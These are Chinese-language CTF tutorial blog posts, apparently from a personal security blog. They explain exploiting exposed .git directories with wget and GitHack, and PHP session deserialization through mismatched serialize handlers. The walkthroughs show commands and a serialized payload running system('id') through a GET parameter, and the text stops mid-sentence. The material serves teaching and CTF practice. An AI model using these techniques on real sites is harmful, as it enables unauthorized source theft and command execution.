class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs nix">.git<span class="hljs-symbol">/</span><br>├── branches<span class="hljs-symbol">/</span>         <span class="hljs-comment"># 旧的分支引用目录，现在基本不再使用</span><br>├── config            <span class="hljs-comment"># 仓库的配置文件，包含仓库级别的配置信息</span><br>├── description       <span class="hljs-comment"># 仓库的描述信息，主要供GitWeb等工具使用</span><br>├── HEAD              <span class="hljs-comment"># 指向当前所在分支的引用</span><br>├── hooks<span class="hljs-symbol">/</span>            <span class="hljs-comment"># 存放钩子脚本的目录，用于在特定的Git操作前后执行自定义脚本</span><br>├── info<span class="hljs-symbol">/</span>             <span class="hljs-comment"># 包含一些仓库的额外信息</span><br>│   └── exclude       <span class="hljs-comment"># 本地的忽略文件，作用类似于 .gitignore</span><br>├── objects<span class="hljs-symbol">/</span>          <span class="hljs-comment"># 存储所有对象数据的目录，如提交对象、树对象、Blob对象等</span><br>│   ├── info<span class="hljs-symbol">/</span><br>│   └── pack<span class="hljs-symbol">/</span><br>├── refs<span class="hljs-symbol">/</span>             <span class="hljs-comment"># 存储引用的目录，如分支、标签等</span><br>│   ├── heads<span class="hljs-symbol">/</span>        <span class="hljs-comment"># 存储本地分支的引用</span><br>│   ├── tags<span class="hljs-symbol">/</span>         <span class="hljs-comment"># 存储标签的引用</span><br>│   └── remotes<span class="hljs-symbol">/</span>      <span class="hljs-comment"># 存储远程分支的引用</span><br>└── index             <span class="hljs-comment"># 暂存区文件，记录了下一次提交时要包含的文件信息</span><br></code></pre></td></tr></table></figure><p>一般来说一个<code>git</code>仓库会存在以下俩文件</p><ol><li>README.md （项目介绍）</li><li><code>.gitignore</code> （配置在git进行文件跟踪的时候忽略掉哪些文件 , 从这个文件一般也可以得到一部分网站的目录结构 , 或者一些日志&#x2F;配置文件等敏感文件）</li></ol><h3 id="一般情况下的开发流程"><a href="#一般情况下的开发流程" class="headerlink" title="一般情况下的开发流程"></a>一般情况下的开发流程</h3><ol><li>初始化仓库 , 并将仓库托管在<code>Coding</code>或者<code>Github</code>上 , 便于远程协作&#x2F;备份&#x2F;部署</li><li>在本地进行网站开发 , 并定时提交<code>commit</code> , <code>push</code>到远程托管网站</li><li>当一个阶段的开发差不多的时候 , 需要远程登陆服务器 , 通过托管网站再将发行版网站<code>pull</code>到<code>Web</code>目录下</li><li>网站正常运行</li></ol><p>这里当网站维护开发人员在从托管网站<code>pull</code>代码的时候，也会将这个存储了所有版本信息的<code>.git</code>文件夹下载到服务器的<code>Web</code>目录下，因此攻击者就可以利用这个目录去下载<code>git</code>文件夹，可以利用其中存储的版本控制信息，完全恢复网站后台的代码和目录结构</p><h2 id="如何利用漏洞"><a href="#如何利用漏洞" class="headerlink" title="如何利用漏洞"></a>如何利用漏洞</h2><h3 id="利用爬虫"><a href="#利用爬虫" class="headerlink" title="利用爬虫"></a>利用爬虫</h3><p>爬虫爬取整个git目录 (这个方法比较原始 , 需要具有一定的Git经验 , 和使用<code>Githack</code>这个工具相比 , 有一个比较好的地方就是 , 可以完全模拟服务器上的代码环境 , 可以跟踪到git的每一次提交 , 但是<code>Githack</code>好像只可以将源码恢复到最近的一次提交，这里的好处还有可以去查看<code>git</code>的提交日志 , 这个日志信息中会有开发人员对每一次<code>commit</code>的描述 , 比如某个BUG的修复等等 , 对于这些和BUG相关的地方 , 可以有针对性地进行白盒审计 , 有可能这个BUG修复了还不如没修复 , 可能会造成更大的漏洞)</p><h4 id="具体思路"><a href="#具体思路" class="headerlink" title="具体思路"></a>具体思路</h4><ol><li>利用爬虫递归下载<code>.git</code>目录的所有文件</li><li>利用git命令对网站的commit历史进行查看</li><li>利用git命令对网站的源码进行恢复</li></ol><h4 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h4><p>演示网站 : <a href="http://www.xxx.com/.git/">http://www.xxx.com/.git/</a></p><ol><li>在虚拟机中利用<code>wget</code>对该目录进行递归下载(-r)</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget -r -p -np -k http://www.xxx.com/.git/<br>--recursive（递归）<br>-k,  --convert-links（转换链接）<br>-p,  --page-requisites（页面必需元素）<br>-np, --no-parent（不追溯至父级）<br></code></pre></td></tr></table></figure><ol start="2"><li>下载完成后 , 进入下载的网站目录</li><li>利用命令 : <code>git log</code> 查看网站的提交记录</li><li>利用命令 : <code>git reset --hard [log hash]</code> 恢复到指定版本号 (一般如果只需要得到源码的话就恢复到最近的一次提交)</li></ol><h4 id="如何防御"><a href="#如何防御" class="headerlink" title="如何防御"></a>如何防御</h4><ol><li>对.git目录的访问权限进行控制</li><li>在每次pull到web目录下之后删除.git文件夹</li></ol><h3 id="利用GitHack脚本"><a href="#利用GitHack脚本" class="headerlink" title="利用GitHack脚本"></a>利用<code>GitHack</code>脚本</h3><p><code>GitHack</code>是一个<code>.git</code>泄露利用脚本，通过泄露的<code>.git</code>文件夹下的文件，还原重建工程源代码。</p><p><code>GitHack</code>脚本下载地址：<a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></p><h4 id="GitHack脚本的工作原理"><a href="#GitHack脚本的工作原理" class="headerlink" title="GitHack脚本的工作原理"></a><code>GitHack</code>脚本的工作原理</h4><ol><li>解析<code>.git/index</code>文件，找到工程中所有的： ( 文件名，文件sha1 )</li><li>去<code>.git/objects/</code>文件夹下下载对应的文件</li><li>使用<code>zlib</code>解压文件，按原始的目录结构写入源代码</li></ol><h4 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python GitHack.py http://www.example.com/.git/     <span class="hljs-comment">#别忘了最后的.git</span><br></code></pre></td></tr></table></figure><p>还原后的文件在 <strong><code>dist/</code></strong> 目录下</p><h4 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h4><ol><li>尝试获取 <code>packs</code>克隆</li><li>尝试目录遍历克隆</li><li>尝试从缓存文件(index)、commit记录中恢复</li></ol><h1 id="CTF做题实战"><a href="#CTF做题实战" class="headerlink" title="CTF做题实战"></a>CTF做题实战</h1><h2 id="题目一"><a href="#题目一" class="headerlink" title="题目一"></a>题目一</h2><p>题目来源</p><blockquote><p><a href="https://ctf.show/challenges#%E7%BB%99%E5%A5%B9-119"><code>ctfshow</code> 萌新赛 给她</a></p></blockquote><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/image-20250330214346166.png" alt="image-20250330214346166"></p><p>看着是要SQL注入，但实际上是要进行<code>.git</code>泄露，这里用<code>GitHack</code>脚本进行泄露</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python</span> GitHack.py https://<span class="hljs-number">6</span>d6e5822-a557-<span class="hljs-number">4</span>a9a-<span class="hljs-number">96</span>c9-<span class="hljs-number">4</span>a46aacb1c63.challenge.ctf.show/.git/<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/image-20250330214644843.png" alt="image-20250330214644843"></p><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/image-20250330214714870.png" alt="image-20250330214714870"></p><p>可以看到源码下载到了这个<code>hint.php</code>文件中了，源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$pass</span>=<span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;and pass=&#x27;%s&#x27;&quot;</span>,<span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]));<br><span class="hljs-variable">$sql</span>=<span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;select * from user where name=&#x27;%s&#x27; <span class="hljs-subst">$pass</span>&quot;</span>,<span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这里考查<code>sprintf</code>漏洞，之后的见另一个笔记<code>sprintf漏洞</code></p><h2 id="题目二"><a href="#题目二" class="headerlink" title="题目二"></a>题目二</h2><p>题目来源</p><blockquote><p>NSSCTF–git泄露</p></blockquote><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/image-20250331132139456.png" alt="image-20250331132139456"></p><p>利用<code>GitHack</code>脚本下载得到源码</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> GitHack.<span class="hljs-keyword">py</span> http://node4.anna.nssctf.<span class="hljs-keyword">cn</span>:<span class="hljs-number">28510</span>/.git/<br></code></pre></td></tr></table></figure><p>源码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs HTML5">&lt;?php<br>if ($_GET[&#x27;wher3&#x27;] === &#x27;nssc7f&#x27;) &#123;<br>    echo getenv(&#x27;FLAG&#x27;);<br>&#125;<br>?&gt;<br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>    &lt;meta charset=&quot;utf-8&quot;&gt;<br>&lt;title&gt;NSSCTF | .git泄露&lt;/title&gt;<br><br>&lt;/html&gt;<br><br>&lt;body&gt;flag在哪里？&lt;/body&gt;<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/image-20250331132315777.png" alt="image-20250331132315777"></p>]]></content>
    
    
    <categories>
      
      <category>信息搜集</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息搜集 Git源码泄露</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Session反序列化</title>
    <link href="/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="前置知识—session"><a href="#前置知识—session" class="headerlink" title="前置知识—session"></a>前置知识—session</h1><p>当<code>session_start()</code>被调用或者<code>php.ini</code>中<code>session.auto_start</code>为1时，PHP内部调用会话管理器，访问用户<code>session</code>被序列化后，存储到指定目录（默认为<code>/tmp</code>）</p><p>存取格式有多种，常见的有如下三种，主要是前俩</p><table><thead><tr><th>处理器</th><th>对应的存储格式</th></tr></thead><tbody><tr><td><code>php</code></td><td>键名 + 竖线 + 经过<code>serialize()</code>函数序列化处理的值</td></tr><tr><td><code>php_serialize</code></td><td>经过<code>serialize()</code>函数序列化处理的数组</td></tr><tr><td><code>php_binary</code></td><td>键名的长度对应的 ASCII 字符 + 键名 + 经过<code>serialize()</code>函数反序列化处理的值</td></tr></tbody></table><p>**漏洞产生：**写入格式和读取格式不一致</p><p>如下一句话可以有多种读取方式</p><p><img src="/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420181040224.png" alt="image-20250420181040224"></p><h2 id="php方式存储"><a href="#php方式存储" class="headerlink" title="php方式存储"></a><strong><code>php</code>方式存储</strong></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;benben&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ben&#x27;</span>];<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>刚开始可以看到<code>/tmp</code>目录下是什么都没有的</p><p><img src="/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420181844079.png" alt="image-20250420181844079"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">ben</span>=123456<br></code></pre></td></tr></table></figure><p>当以GET形式提交参数<code>ben</code>后，再次查看会出现一个<code>sess</code>文件，存储的是刚才提交内容，格式为</p><p><img src="/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420183509582.png" alt="image-20250420183509582"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 键名 + 竖线 + 经过序列化处理后的数据</span><br>benben|s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;<br></code></pre></td></tr></table></figure><p>默认情况下是使用<code>php</code>格式进行储存</p><h2 id="php-serialize方式存储"><a href="#php-serialize方式存储" class="headerlink" title="php_serialize方式存储"></a><code>php_serialize</code>方式存储</h2><p>如果要使用这个格式进行存储，首先要进行一个声明，声明存储格式为<code>php_serialize</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>,<span class="hljs-string">&#x27;php_serialize&#x27;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;benben&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ben&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;b&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>GET提交两个参数</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">ben</span>=dazhunag&amp;b=666<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420183339176.png" alt="image-20250420183339176"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 经过serialize()函数序列化处理的数组</span><br>a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;ben&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;dazhuang&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;666&quot;</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="php-binary方式存储"><a href="#php-binary方式存储" class="headerlink" title="php_binary方式存储"></a><code>php_binary</code>方式存储</h2><p>和<code>php_serialize</code>方式存储一样，要先声明存储格式为<code>php_binary</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>,<span class="hljs-string">&#x27;php_binary&#x27;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;benben&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ben&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;b&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">benben</span>=dazhuang&amp;b=666<br></code></pre></td></tr></table></figure><p>需要用二进制的方式查看</p><p><img src="/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420184444560.png" alt="image-20250420184444560"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 键名的长度对应的ASCII字符 + 键名 + 经过serialize()函数序列化处理的值</span><br>ACKbenbens:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;dazhuang&quot;</span>;SOHbs:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;666&quot;</span>;<br></code></pre></td></tr></table></figure><p>前面的<code>ACK</code>对应的就是<code>06</code>（键名<code>benben</code>的长度），<code>SOH</code>是<code>01</code>（键名<code>b</code>的长度）</p><h1 id="PHP-session反序列化漏洞"><a href="#PHP-session反序列化漏洞" class="headerlink" title="PHP session反序列化漏洞"></a>PHP session反序列化漏洞</h1><p>**漏洞成因：**当网站序列化并存储<code>session</code>，与反序列化并读取<code>session</code>的方式不同时，就可能导致<code>session</code>反序列化漏洞的产生</p><p>如下两个页面，第一个页面如下，可以以<code>php_serialize</code>的方式写进去进行存储</p><p><img src="/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420190424176.png" alt="image-20250420190424176"></p><p>第二个页面如下，可以以<code>php</code>的方式进行读取</p><p><img src="/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420190441210.png" alt="image-20250420190441210"></p><p>在第二个页面可以通过序列化执行命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">D</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;system(&#x27;id&#x27;);&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">D</span>());<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420185635290.png" alt="image-20250420185635290"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;D&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;s:<span class="hljs-number">13</span>:<span class="hljs-string">&quot;system(&#x27;id&#x27;);&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>在第二个页面是没有提交的地方的，但可以在第一个页面中进行GET提交参数a</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>,<span class="hljs-string">&#x27;php_serialize&#x27;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;ben&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>这里可以在第一个页面进行写入，在第二个页面进行读取并执行命令</p><p>注意到这里提交写进去是以<code>php_serialize</code>的方式，但是读取的时候是以<code>php</code>方式进行读取的</p><p><strong><code>php</code>的读取方式是以竖线<code>|</code>为分隔符，竖线<code>|</code>前面的是键名，竖线<code>|</code>后面的就是要反序列化的内容</strong></p><p>在第一个页面提交GET参数<code>a</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?a=|O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;D&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;s:<span class="hljs-number">13</span>:<span class="hljs-string">&quot;system(&#x27;id&#x27;);&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>这里是以<code>php_serialize</code>的方式写入的，最终存储的样子为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># php_serialize：经过serialize()序列化处理的数组</span><br>a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;ben&quot;</span>;s:<span class="hljs-number">39</span>:<span class="hljs-string">&quot;|O:1:&quot;</span>D<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span>a<span class="hljs-string">&quot;;s:13:&quot;</span><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;id&#x27;</span>);<span class="hljs-string">&quot;;&#125;&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>当在第二个界面以<code>php</code>的方式去读取的时候</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># php：键名 + 竖线 + 经过serialize反序列化处理的值</span><br><br><span class="hljs-comment"># 当作键名的部分为</span><br>a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;ben&quot;</span>;s:<span class="hljs-number">39</span>:<span class="hljs-string">&quot;</span><br><span class="hljs-string"># 进行反序列化的部分为</span><br><span class="hljs-string">O:1:&quot;</span>D<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span>a<span class="hljs-string">&quot;;s:13:&quot;</span><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;id&#x27;</span>);<span class="hljs-string">&quot;;&#125;&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>对于进行反序列化的部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;D&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;s:<span class="hljs-number">13</span>:<span class="hljs-string">&quot;system(&#x27;id&#x27;);&quot;</span>;&#125;<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>在前面的部分已经使用了<code>;&#125;</code>进行了闭合，满足了序列化数据的格式，所以后面剩余的<code>“;&#125;</code>就是无用的</p><p>所以最终会被反序列化的部分是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;D&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;s:<span class="hljs-number">13</span>:<span class="hljs-string">&quot;system(&#x27;id&#x27;);&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420192710093.png" alt="image-20250420192710093"></p><p>直接访问第二个页面就会得到命令执行的回显</p><p><img src="/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420192815930.png" alt="image-20250420192815930"></p><p>综上，<code>session</code>反序列化要满足有一个页面可以写入，还有一个页面可以读取，并且两个页面的方式是不一样的，就会出现<code>session</code>反序列化</p><h1 id="PHP-session反序列化例题"><a href="#PHP-session反序列化例题" class="headerlink" title="PHP session反序列化例题"></a>PHP session反序列化例题</h1><p>题目的<code>index.php</code>的源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">/*hint.php*/</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$her</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;her=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10000</span>));<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;name===<span class="hljs-variable language_">$this</span>-&gt;her)&#123;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>可以看到有个<code>hint.php</code>页面，访问得到源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php_serialize&#x27;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;a&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p><strong>审计代码</strong></p><ul><li>在<code>index.php</code>页面中，启动了一个 PHP 